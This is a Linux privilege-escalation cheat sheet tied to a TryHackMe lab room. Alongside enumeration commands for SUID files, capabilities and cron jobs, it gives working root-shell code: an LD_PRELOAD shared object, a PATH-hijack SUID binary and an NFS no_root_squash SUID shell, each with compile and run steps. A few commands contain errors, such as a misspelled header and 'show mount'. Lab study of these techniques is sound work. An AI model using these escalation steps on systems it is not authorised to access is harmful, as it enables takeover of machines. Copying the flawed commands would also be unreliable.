# Linux Privilege Escalation

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

## Check for Kernel Exploits

```
uname -r
```
**************************************
## Check for SUID or SGID Bits Set
```
find / -type f -perm -04000 -ls 2>/dev/null
```
SUID Only:
```
find / -perm -u=s -type f 2>/dev/null
```
**************************************
## Check Capabilities
```
getcap -r / 2>/dev/null
```
**************************************
## Check Cron Jobs
```
cat /etc/crontab
```
**************************************
## Leverage LD_PRELOAD

Check for LD_PRELOAD (with env_keep option)
```
sudo -l
```

Write a simple C code compiled as a share object (.so extension) file

* The C code will simply spawn a root shell and can be written as follows:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Save this code as shell.c and compile it using gcc into a shared object file using the following parameters
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Run the program by specifying the LD_PRELOAD option, as follows:
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
**************************************
## PATH

```
echo $PATH
```
* What folders are located under $PATH?
* Does your current user have write privileges for any of these folders?
* Can you modify $PATH?
* Is there a script/application you can start that will be affected by this vulnerability?

Example Script: 
```
#include<unlistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("[BINARY]");
}
```
```
gcc path_exp.c -o path -w
```
```
chmod u+s path
```

Search for writable directories:
```
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```
To make a writable directory under $PATH:
```
export PATH=/tmp:$PATH
```
```
cd /tmp
```
```
echo "/bin/bash/" > [BINARY]
```
```
chmod 777 [BINARY]
```
```
./path
```
**************************************
## Network File Sharing (NFS)

If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
```
cat /etc/exports
```

Enumerate mountable shares:
```
show mount -e [TARGET-IP]
```

Mount one of the “no_root_squash” shares to attack machine and start building executable:
```
mkdir /tmp/[YOUR-DIRECTORY]
```
```
mount -o rw [TARGET-IP]:[SHARE-DIRECTORY] /tmp/[YOUR-DIRECTORY]
```

Set SUID bits with a simple executable that will run /bin/bash on the target system: (nfs.c)
```
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

Compile the code:
```
gcc nfs.c -o nfs -w
```
```
chmod +s nfs
```
```
./nfs
```

**************************************
## Reference
* https://tryhackme.com/room/linprivesc
